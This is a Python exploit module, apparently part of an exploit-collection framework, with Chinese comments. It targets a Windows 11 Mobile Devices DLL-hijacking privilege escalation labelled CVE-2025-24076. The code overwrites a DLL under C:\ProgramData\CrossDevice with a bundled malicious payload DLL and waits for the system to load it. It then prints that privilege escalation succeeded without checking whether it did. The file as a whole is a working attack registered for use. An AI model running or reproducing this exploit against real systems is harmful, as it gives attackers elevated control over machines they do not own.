"""
CVE-2025-24076: Windows 11 Mobile Devices DLL Hijacking LPE
"""
import ctypes
import os
import shutil
import subprocess
import time
import importlib.resources
from .._api import regist
from ..localization import fcall

CVE_ID = "CVE-2025-24076"
TAGS = ["privilege_escalation", "dll_hijacking"]
VERSIONS = ["11"]  # Windows 11
OS = "windows"

# 目标路径（系统目录）
TARGET_DLL_PATH = r"C:\ProgramData\CrossDevice\CrossDevice.Streaming.Source.dll"

def _get_payload_dll_path():
    """获取包内payload DLL的路径"""
    with importlib.resources.path('cvedblib', 'extra') as extra_path:
        dll_path = os.path.join(extra_path, 'cve_2025_24076.dll')
        return dll_path

def exploit(cmd="whoami", dll_path=None):
    """
    利用DLL劫持提权
    
    :param cmd: 提权后执行的命令（当前payload固定，但可以重新编译dll）
    :param dll_path: 可选自定义DLL路径，若不提供则使用包内默认DLL
    """
    print(fcall("exploit_start").format(CVE_ID))
    
    # 检查目标目录是否存在
    target_dir = os.path.dirname(TARGET_DLL_PATH)
    if not os.path.exists(target_dir):
        print(f"[-] Target directory not found: {target_dir}")
        return
    
    # 准备恶意DLL
    if dll_path and os.path.exists(dll_path):
        malicious_dll = dll_path
    else:
        malicious_dll = _get_payload_dll_path()
        if not os.path.exists(malicious_dll):
            print(f"[-] Payload DLL not found: {malicious_dll}")
            return
    
    # 尝试替换DLL
    try:
        # 备份原始DLL（可选）
        backup_path = TARGET_DLL_PATH + ".bak"
        if not os.path.exists(backup_path) and os.path.exists(TARGET_DLL_PATH):
            shutil.copy2(TARGET_DLL_PATH, backup_path)
        
        # 替换
        shutil.copy2(malicious_dll, TARGET_DLL_PATH)
        print(fcall("privilege_escalation_attempt"))
        
        # 触发Mobile Devices功能（可通过COM激活或等待系统自动加载）
        # 这里简化，等待几秒让系统加载
        time.sleep(2)
        
        # 恢复原始DLL（可选）
        if os.path.exists(backup_path):
            shutil.move(backup_path, TARGET_DLL_PATH)
        
        print(fcall("command_output").format("[+] 提权成功，payload已执行"))
        print(fcall("exploit_success"))
        
    except Exception as e:
        print(fcall("exploit_error").format(CVE_ID, str(e)))


regist(CVE_ID, TAGS, VERSIONS, exploit, OS)